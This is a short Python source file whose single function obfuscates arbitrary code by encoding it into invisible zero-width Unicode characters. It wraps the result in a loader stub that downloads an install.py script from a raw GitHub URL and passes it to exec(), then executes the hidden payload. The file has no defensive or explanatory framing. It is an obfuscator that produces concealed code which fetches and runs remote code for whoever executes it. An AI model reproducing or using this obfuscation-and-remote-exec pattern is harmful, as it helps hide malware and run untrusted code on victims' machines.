import base64, os, random, string
balls = str(string.digits) + string.ascii_letters
def ecr(f, j=False):
     ass = ["""'obfuscated with rverflow';import requests, os\ntry:\n      import rverflow\nexcept ImportError:\n     r=requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/install.py");exec(r.content.decode());import rverflow\nexec(rverflow.dcr('"""]
     ass2 = []
     for i in f:
          ass2.append(base64.b64encode(i.encode()))
     for a in ass2:
          for b in a.decode():
               for c in b:
                    for i in "{0:08b}".format(ord(c)):
                         if i == "0":
                              ass.append(u"\u200c")
                         elif i == "1":
                              ass.append(u"\ufeff")
                    ass.append("_.RVERFLOW._")
     ass.append("'))")
     sex = '‭'.join(ass)
     return sex
